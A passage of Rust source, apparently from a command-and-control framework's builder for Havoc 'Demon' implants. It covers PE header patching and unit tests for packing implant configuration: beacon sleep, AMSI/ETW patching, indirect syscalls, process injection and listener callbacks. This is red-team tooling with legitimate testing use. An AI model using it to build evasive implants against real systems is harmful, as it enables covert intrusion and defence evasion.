        Architecture::X86 => &binary_patch.replace_strings_x86,
    };
    for (old, new) in replacements {
        let mut replacement = new.as_bytes().to_vec();
        if replacement.len() > old.len() {
            return Err(PayloadBuildError::InvalidRequest {
                message: format!("replacement value `{new}` is longer than search string `{old}`"),
            });
        }
        replacement.resize(old.len(), 0);
        bytes = replace_all(bytes, old.as_bytes(), &replacement);
    }

    Ok(bytes)
}

fn parse_header_u32_field(field_name: &str, value: &str) -> Result<u32, PayloadBuildError> {
    let trimmed = value.trim();
    let parsed =
        if let Some(hex) = trimmed.strip_prefix("0x").or_else(|| trimmed.strip_prefix("0X")) {
            u32::from_str_radix(hex, 16)
        } else {
            trimmed.parse::<u32>()
        };

    parsed.map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("{field_name} `{trimmed}` must be a valid u32 value"),
    })
}

fn pe_offsets(bytes: &[u8]) -> Result<(usize, usize), PayloadBuildError> {
    const DOS_HEADER_PE_POINTER_OFFSET: usize = 0x3C;
    const PE_SIGNATURE_SIZE: usize = 4;
    const FILE_HEADER_SIZE: usize = 20;

    if bytes.len() < DOS_HEADER_PE_POINTER_OFFSET + 4 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload is too small to contain a PE header".to_owned(),
        });
    }

    let pe_offset = u32::from_le_bytes(
        bytes[DOS_HEADER_PE_POINTER_OFFSET..DOS_HEADER_PE_POINTER_OFFSET + 4].try_into().map_err(
            |_| PayloadBuildError::InvalidRequest {
                message: "payload is too small to contain a PE header".to_owned(),
            },
        )?,
    );
    let pe_offset = usize::try_from(pe_offset).map_err(|_| PayloadBuildError::InvalidRequest {
        message: "payload PE header offset does not fit in memory".to_owned(),
    })?;

    if bytes.len() < pe_offset + PE_SIGNATURE_SIZE + FILE_HEADER_SIZE {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload PE header is truncated".to_owned(),
        });
    }

    if bytes[pe_offset..pe_offset + PE_SIGNATURE_SIZE] != *b"PE\0\0" {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload does not contain a valid PE signature".to_owned(),
        });
    }

    let optional_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HEADER_SIZE;
    if bytes.len() < optional_header_offset + 60 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload PE optional header is truncated".to_owned(),
        });
    }

    Ok((pe_offset, optional_header_offset))
}

fn write_pe_file_header_timestamp(
    bytes: &mut [u8],
    timestamp: u32,
) -> Result<(), PayloadBuildError> {
    let (pe_offset, _) = pe_offsets(bytes)?;
    let timestamp_offset = pe_offset + 8;
    bytes[timestamp_offset..timestamp_offset + 4].copy_from_slice(&timestamp.to_le_bytes());
    Ok(())
}

fn write_pe_optional_header_image_size(
    bytes: &mut [u8],
    image_size: u32,
) -> Result<(), PayloadBuildError> {
    let (_, optional_header_offset) = pe_offsets(bytes)?;
    let image_size_offset = optional_header_offset + 56;
    bytes[image_size_offset..image_size_offset + 4].copy_from_slice(&image_size.to_le_bytes());
    Ok(())
}

fn replace_all(mut haystack: Vec<u8>, needle: &[u8], replacement: &[u8]) -> Vec<u8> {
    if needle.is_empty() {
        return haystack;
    }

    let mut offset = 0;
    while let Some(position) =
        haystack[offset..].windows(needle.len()).position(|window| window == needle)
    {
        let start = offset + position;
        haystack[start..start + needle.len()].copy_from_slice(replacement);
        offset = start + replacement.len();
    }
    haystack
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;
    use std::path::Path;

    use super::cache::CacheKey;
    use super::*;
    use red_cell_common::HttpListenerProxyConfig as DomainHttpListenerProxyConfig;
    use serde_json::json;
    use zeroize::Zeroizing;

    #[test]
    fn from_profile_resolves_workspace_root_and_toolchain() -> Result<(), Box<dyn std::error::Error>>
    {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(&temp.path().join("bin/x64-gcc"))?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);
        let repo_root = workspace_root()?;

        let service = PayloadBuilderService::from_profile_with_repo_root_impl(
            &profile,
            &repo_root,
            read_fake_script_output,
        )?;

        assert_eq!(service.inner.toolchain.compiler_x64, compiler_x64.canonicalize()?);
        assert_eq!(service.inner.toolchain.compiler_x86, compiler_x86.canonicalize()?);
        assert_eq!(service.inner.toolchain.nasm, nasm.canonicalize()?);
        assert_eq!(service.inner.toolchain.compiler_x64_version.major, 12);
        assert_eq!(service.inner.toolchain.nasm_version.major, 2);
        assert_eq!(service.inner.source_root, repo_root.join("src/Havoc/payloads/Demon"));
        assert_eq!(
            service.inner.shellcode_x64_template,
            repo_root.join("src/Havoc/payloads/Shellcode.x64.bin")
        );
        assert_eq!(
            service.inner.shellcode_x86_template,
            repo_root.join("src/Havoc/payloads/Shellcode.x86.bin")
        );
        assert_eq!(service.inner.default_demon, profile.demon);
        Ok(())
    }

    #[test]
    fn from_profile_with_repo_root_resolves_toolchain_and_havoc_assets()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(&temp.path().join("bin/x64-gcc"))?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let service = PayloadBuilderService::from_profile_with_repo_root_impl(
            &profile,
            temp.path(),
            read_fake_script_output,
        )?;

        assert_eq!(service.inner.toolchain.compiler_x64, compiler_x64.canonicalize()?);
        assert_eq!(service.inner.toolchain.compiler_x86, compiler_x86.canonicalize()?);
        assert_eq!(service.inner.toolchain.nasm, nasm.canonicalize()?);
        assert_eq!(
            service.inner.toolchain.compiler_x64_version,
            ToolchainVersion { major: 12, minor: 2, patch: 0, raw: "12.2.0".to_owned() }
        );
        assert_eq!(
            service.inner.toolchain.compiler_x86_version,
            ToolchainVersion { major: 12, minor: 2, patch: 0, raw: "12.2.0".to_owned() }
        );
        assert_eq!(
            service.inner.toolchain.nasm_version,
            ToolchainVersion { major: 2, minor: 16, patch: 1, raw: "2.16.01".to_owned() }
        );
        assert_eq!(service.inner.source_root, temp.path().join("src/Havoc/payloads/Demon"));
        assert_eq!(
            service.inner.shellcode_x64_template,
            temp.path().join("src/Havoc/payloads/Shellcode.x64.bin")
        );
        assert_eq!(
            service.inner.shellcode_x86_template,
            temp.path().join("src/Havoc/payloads/Shellcode.x86.bin")
        );
        assert_eq!(
            service.inner.dllldr_x64_template,
            temp.path().join("src/Havoc/payloads/DllLdr.x64.bin")
        );
        assert_eq!(
            service.inner.stager_template,
            temp.path().join("payloads/templates/MainStager.c")
        );
        assert_eq!(service.inner.default_demon, profile.demon);
        Ok(())
    }

    #[test]
    fn from_profile_rejects_missing_toolchain_binary() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = temp.path().join("bin/missing-x64-gcc");
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())
            .expect_err("missing compiler should be rejected");

        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("executable does not exist")
                    && message.contains("missing-x64-gcc")
        ));
        Ok(())
    }

    #[test]
    fn from_profile_with_repo_root_resolves_relative_toolchain_paths_against_repo_root()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(
            &temp.path().join("data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"),
        )?;
        let compiler_x86 = write_fake_gcc(
            &temp.path().join("data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"),
        )?;
        let nasm = write_fake_nasm(&temp.path().join("data/nasm/bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(
            Path::new("data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"),
            Path::new("data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"),
            Path::new("data/nasm/bin/nasm"),
        );

        let service = PayloadBuilderService::from_profile_with_repo_root_impl(
            &profile,
            temp.path(),
            read_fake_script_output,
        )?;

        assert_eq!(service.inner.toolchain.compiler_x64, compiler_x64.canonicalize()?);
        assert_eq!(service.inner.toolchain.compiler_x86, compiler_x86.canonicalize()?);
        assert_eq!(service.inner.toolchain.nasm, nasm.canonicalize()?);
        Ok(())
    }

    #[test]
    fn from_profile_with_repo_root_reports_missing_relative_toolchain_from_repo_root()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x86 = write_fake_gcc(
            &temp.path().join("data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"),
        )?;
        let nasm = write_fake_nasm(&temp.path().join("data/nasm/bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let missing_relative = Path::new("data/x86_64-w64-mingw32-cross/bin/missing-gcc");
        let profile = constructor_test_profile(missing_relative, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root(&profile, temp.path())
            .expect_err("missing relative compiler should be rejected");

        let expected = temp.path().join(missing_relative);
        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("executable does not exist")
                    && message.contains(&expected.display().to_string())
        ));
        Ok(())
    }

    #[test]
    fn from_profile_rejects_missing_payload_assets() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(&temp.path().join("bin/x64-gcc"))?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        create_payload_assets(temp.path())?;
        std::fs::remove_file(temp.path().join("src/Havoc/payloads/Shellcode.x86.bin"))?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root_impl(
            &profile,
            temp.path(),
            read_fake_script_output,
        )
        .expect_err("missing asset should be rejected");

        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("required payload asset missing")
                    && message.contains("Shellcode.x86.bin")
        ));
        Ok(())
    }

    #[test]
    fn from_profile_rejects_outdated_gcc() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_executable_with_output(
            &temp.path().join("bin/x64-gcc"),
            "x86_64-w64-mingw32-gcc (GCC) 8.3.0 (Release)",
        )?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_nasm(&temp.path().join("bin/nasm"))?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root_impl(
            &profile,
            temp.path(),
            read_fake_script_output,
        )
        .expect_err("outdated gcc should be rejected");

        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("below the minimum required")
                    && message.contains("8.3.0")
        ));
        Ok(())
    }

    #[test]
    fn from_profile_rejects_outdated_nasm() -> Result<(), Box<dyn std::error::Error>> {
        let temp = TempDir::new()?;
        let compiler_x64 = write_fake_gcc(&temp.path().join("bin/x64-gcc"))?;
        let compiler_x86 = write_fake_gcc(&temp.path().join("bin/x86-gcc"))?;
        let nasm = write_fake_executable_with_output(
            &temp.path().join("bin/nasm"),
            "NASM version 2.10.07 compiled on Jan  1 2015",
        )?;
        create_payload_assets(temp.path())?;
        let profile = constructor_test_profile(&compiler_x64, &compiler_x86, &nasm);

        let error = PayloadBuilderService::from_profile_with_repo_root_impl(
            &profile,
            temp.path(),
            read_fake_script_output,
        )
        .expect_err("outdated nasm should be rejected");

        assert!(matches!(
            error,
            PayloadBuildError::ToolchainUnavailable { message }
                if message.contains("below the minimum required")
                    && message.contains("2.10.07")
        ));
        Ok(())
    }

    // ── compiler diagnostic parser ────────────────────────────────────────

    #[test]
    fn parse_compiler_diagnostic_gcc_with_column() {
        let diag = parse_compiler_diagnostic(
            "src/core/Inject.c:42:8: error: 'foo' undeclared (first use in this function)",
        )
        .expect("should parse GCC error with column");

        assert_eq!(diag.filename, "src/core/Inject.c");
        assert_eq!(diag.line, 42);
        assert_eq!(diag.column, Some(8));
        assert_eq!(diag.severity, "error");
        assert_eq!(diag.error_code, None);
        assert_eq!(diag.message, "'foo' undeclared (first use in this function)");
    }

    #[test]
    fn parse_compiler_diagnostic_gcc_warning_with_flag() {
        let diag = parse_compiler_diagnostic(
            "src/Demon.c:10:3: warning: unused variable 'x' [-Wunused-variable]",
        )
        .expect("should parse GCC warning with flag");

        assert_eq!(diag.filename, "src/Demon.c");
        assert_eq!(diag.line, 10);
        assert_eq!(diag.column, Some(3));
        assert_eq!(diag.severity, "warning");
        assert_eq!(diag.error_code.as_deref(), Some("-Wunused-variable"));
        assert_eq!(diag.message, "unused variable 'x'");
    }

    #[test]
    fn parse_compiler_diagnostic_gcc_fatal_error_no_column() {
        let diag = parse_compiler_diagnostic(
            "src/Demon.c:1: fatal error: windows.h: No such file or directory",
        )
        .expect("should parse GCC fatal error without column");

        assert_eq!(diag.filename, "src/Demon.c");
        assert_eq!(diag.line, 1);
        assert_eq!(diag.column, None);
        assert_eq!(diag.severity, "fatal error");
        assert_eq!(diag.error_code, None);
        assert!(diag.message.contains("No such file or directory"));
    }

    #[test]
    fn parse_compiler_diagnostic_nasm_error() {
        let diag = parse_compiler_diagnostic(
            "src/asm/HookDetect.x64.asm:55: error: symbol `_start' undefined",
        )
        .expect("should parse NASM error");

        assert_eq!(diag.filename, "src/asm/HookDetect.x64.asm");
        assert_eq!(diag.line, 55);
        assert_eq!(diag.column, None);
        assert_eq!(diag.severity, "error");
        assert_eq!(diag.message, "symbol `_start' undefined");
    }

    #[test]
    fn parse_compiler_diagnostic_nasm_warning() {
        let diag = parse_compiler_diagnostic(
            "src/asm/Sleep.x64.asm:12: warning: uninitialized space declared in non-BSS section",
        )
        .expect("should parse NASM warning");

        assert_eq!(diag.severity, "warning");
        assert_eq!(diag.line, 12);
    }

    #[test]
    fn parse_compiler_diagnostic_returns_none_for_plain_text() {
        assert!(parse_compiler_diagnostic("stub compiler error").is_none());
        assert!(parse_compiler_diagnostic("In file included from foo.c:").is_none());
        assert!(parse_compiler_diagnostic("").is_none());
    }

    #[test]
    fn parse_compiler_diagnostic_returns_none_for_context_line() {
        // GCC indented caret/context lines should not be treated as diagnostics.
        assert!(parse_compiler_diagnostic("   10 |   int x = foo;").is_none());
        assert!(parse_compiler_diagnostic("      |           ^^^").is_none());
    }

    #[test]
    fn extract_gcc_flag_strips_trailing_bracket_flag() {
        let (msg, code) = extract_gcc_flag("unused variable 'x' [-Wunused-variable]");
        assert_eq!(msg, "unused variable 'x'");
        assert_eq!(code.as_deref(), Some("-Wunused-variable"));
    }

    #[test]
    fn extract_gcc_flag_strips_werror_flag() {
        let (msg, code) =
            extract_gcc_flag("deprecated declaration [-Werror=deprecated-declarations]");
        assert_eq!(code.as_deref(), Some("-Werror=deprecated-declarations"));
        assert_eq!(msg, "deprecated declaration");
    }

    #[test]
    fn extract_gcc_flag_no_flag_returns_message_unchanged() {
        let (msg, code) = extract_gcc_flag("'foo' undeclared");
        assert_eq!(msg, "'foo' undeclared");
        assert!(code.is_none());
    }

    #[test]
    fn merged_request_config_applies_profile_defaults() -> Result<(), Box<dyn std::error::Error>> {
        let config = merged_request_config(
            r#"{"Injection":{"Alloc":"Win32","Execute":"Win32"}}"#,
            "demon",
            &DemonConfig {
                sleep: Some(10),
                jitter: Some(25),
                indirect_syscall: true,
                stack_duplication: true,
                sleep_technique: Some("Ekko".to_owned()),
                proxy_loading: Some("RtlCreateTimer".to_owned()),
                amsi_etw_patching: Some("Hardware breakpoints".to_owned()),
                injection: Some(red_cell_common::config::ProcessInjectionConfig {
                    spawn64: Some("C:\\Windows\\System32\\notepad.exe".to_owned()),
                    spawn32: Some("C:\\Windows\\SysWOW64\\notepad.exe".to_owned()),
                }),
                dotnet_name_pipe: Some(r"\\.\pipe\red-cell-dotnet".to_owned()),
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
        )?;

        assert_eq!(config.get("Sleep"), Some(&Value::String("10".to_owned())));
        assert_eq!(config.get("Jitter"), Some(&Value::String("25".to_owned())));
        assert_eq!(config.get("Indirect Syscall"), Some(&Value::Bool(true)));
        assert_eq!(config.get("Stack Duplication"), Some(&Value::Bool(true)));
        assert_eq!(config.get("Sleep Technique"), Some(&Value::String("Ekko".to_owned())));
        assert_eq!(config.get("DotNetNamePipe"), None);
        assert_eq!(
            config["Injection"]["Spawn64"],
            Value::String("C:\\Windows\\System32\\notepad.exe".to_owned())
        );
        assert_eq!(
            config["Injection"]["Spawn32"],
            Value::String("C:\\Windows\\SysWOW64\\notepad.exe".to_owned())
        );
        Ok(())
    }

    #[test]
    fn pack_config_matches_expected_http_layout() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "15",
            "Indirect Syscall": true,
            "Stack Duplication": true,
            "Sleep Technique": "Ekko",
            "Sleep Jmp Gadget": "jmp rbx",
            "Proxy Loading": "RtlCreateTimer",
            "Amsi/Etw Patch": "Hardware breakpoints",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Native/Syscall",
                "Spawn64": "C:\\Windows\\System32\\notepad.exe",
                "Spawn32": "C:\\Windows\\SysWOW64\\notepad.exe"
            }
        }))?;
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: Some("1234".to_owned()),
            working_hours: Some("08:00-17:00".to_owned()),
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: Some("Mozilla".to_owned()),
            headers: vec!["Header: One".to_owned()],
            uris: vec!["/beacon".to_owned()],
            host_header: Some("front.local".to_owned()),
            secure: true,
            cert: None,
            response: None,
            proxy: Some(DomainHttpListenerProxyConfig {
                enabled: true,
                proxy_type: Some("http".to_owned()),
                host: "proxy.local".to_owned(),
                port: 8080,
                username: Some("neo".to_owned()),
                password: Some(Zeroizing::new("trinity".to_owned())),
            }),
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 15);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_wstring(&mut cursor)?, "C:\\Windows\\System32\\notepad.exe");
        assert_eq!(read_wstring(&mut cursor)?, "C:\\Windows\\SysWOW64\\notepad.exe");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1); // HeapEnc (default true)
        assert_eq!(read_u64(&mut cursor)?, 1234);
        assert_eq!(read_u32(&mut cursor)?, 5_243_968);
        assert_eq!(read_wstring(&mut cursor)?, "POST");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "listener.local");
        assert_eq!(read_u32(&mut cursor)?, 443);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "Mozilla");
        assert_eq!(read_u32(&mut cursor)?, 2);
        assert_eq!(read_wstring(&mut cursor)?, "Header: One");
        assert_eq!(read_wstring(&mut cursor)?, "Host: front.local");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "/beacon");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "http://proxy.local:8080");
        assert_eq!(read_wstring(&mut cursor)?, "neo");
        assert_eq!(read_wstring(&mut cursor)?, "trinity");
        assert_eq!(read_u32(&mut cursor)?, 1); // ja3_randomize: true (secure=true, ja3_randomize=None → defaults to true)
        assert_eq!(read_bytes(&mut cursor)?, b""); // DoH domain: disabled (doh_domain=None)
        assert_eq!(read_u32(&mut cursor)?, 0); // DoH provider: Cloudflare (default)
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn pack_config_ends_after_listener_specific_fields() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "a");
        assert_eq!(read_wstring(&mut cursor)?, "b");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1); // HeapEnc (default true)
        assert_eq!(read_wstring(&mut cursor)?, r"\\.\pipe\pivot");
        assert_eq!(read_u64(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn pack_config_http_without_proxy_ends_after_disabled_proxy_flag()
    -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "a");
        assert_eq!(read_wstring(&mut cursor)?, "b");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1); // HeapEnc (default true)
        assert_eq!(read_u64(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_wstring(&mut cursor)?, "POST");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "listener.local");
        assert_eq!(read_u32(&mut cursor)?, 443);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "Content-type: */*");
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "/");
        assert_eq!(read_u32(&mut cursor)?, 0); // proxy disabled
        assert_eq!(read_u32(&mut cursor)?, 1); // ja3_randomize: true (secure=true, ja3_randomize=None → defaults to true)
        assert_eq!(read_bytes(&mut cursor)?, b""); // DoH domain: disabled (doh_domain=None)
        assert_eq!(read_u32(&mut cursor)?, 0); // DoH provider: Cloudflare (default)
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn pack_config_rejects_dns_listener() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = ListenerConfig::Dns(red_cell_common::DnsListenerConfig {
            name: "dns".to_owned(),
            host_bind: "0.0.0.0".to_owned(),
            port_bind: 53,
            domain: "c2.local".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        });

        let error = pack_config(&listener, &config).expect_err("dns listener should be rejected");
        assert!(matches!(
            error,
            PayloadBuildError::InvalidRequest { message }
                if message.contains("not supported for Demon payload builds")
        ));
        Ok(())
    }

    fn minimal_config_json() -> Map<String, Value> {
        serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))
        .expect("valid test json")
    }

    fn http_listener_with_method(method: Option<&str>) -> ListenerConfig {
        ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost:80".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: method.map(str::to_owned),
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }))
    }

    #[test]
    fn pack_config_accepts_post_method() -> Result<(), Box<dyn std::error::Error>> {
        let listener = http_listener_with_method(Some("POST"));
        pack_config(&listener, &minimal_config_json()).expect("POST should be accepted");
        Ok(())
    }

    #[test]
    fn pack_config_accepts_post_method_case_insensitive() -> Result<(), Box<dyn std::error::Error>>
    {
        let canonical = {
            let listener = http_listener_with_method(Some("POST"));
            pack_config(&listener, &minimal_config_json()).expect("POST should be accepted")
        };
        let normalised = {
            let listener = http_listener_with_method(Some("post"));
            pack_config(&listener, &minimal_config_json())
                .expect("lowercase post should be accepted")
        };
        assert_eq!(
            canonical, normalised,
            "method=post must produce identical bytes to method=POST after case normalisation"
        );
        Ok(())
    }

    #[test]
    fn pack_config_rejects_head_method() {
        let listener = http_listener_with_method(Some("HEAD"));
        let error =
            pack_config(&listener, &minimal_config_json()).expect_err("HEAD should be rejected");
        assert!(
            matches!(&error, PayloadBuildError::InvalidRequest { message } if message.contains("HEAD")),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn pack_config_rejects_get_method() {
        let listener = http_listener_with_method(Some("GET"));
        let error =
            pack_config(&listener, &minimal_config_json()).expect_err("GET should be rejected");
        assert!(
            matches!(&error, PayloadBuildError::InvalidRequest { message } if message.contains("GET")),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn pack_config_rejects_delete_method() {
        let listener = http_listener_with_method(Some("DELETE"));
        let error =
            pack_config(&listener, &minimal_config_json()).expect_err("DELETE should be rejected");
        assert!(
            matches!(&error, PayloadBuildError::InvalidRequest { message } if message.contains("DELETE")),
            "unexpected error: {error}"
        );
    }

    #[test]
    fn pack_config_method_none_defaults_to_post() -> Result<(), Box<dyn std::error::Error>> {
        // Producing a config with method=None should yield the same bytes as method=Some("POST").
        let bytes_default = pack_config(&http_listener_with_method(None), &minimal_config_json())?;
        let bytes_explicit =
            pack_config(&http_listener_with_method(Some("POST")), &minimal_config_json())?;
        assert_eq!(bytes_default, bytes_explicit);
        Ok(())
    }

    /// Helper: build a minimal HTTPS listener with an optional `ja3_randomize` override.
    fn https_listener_with_ja3(ja3_randomize: Option<bool>) -> ListenerConfig {
        ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "https".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost:443".to_owned()],
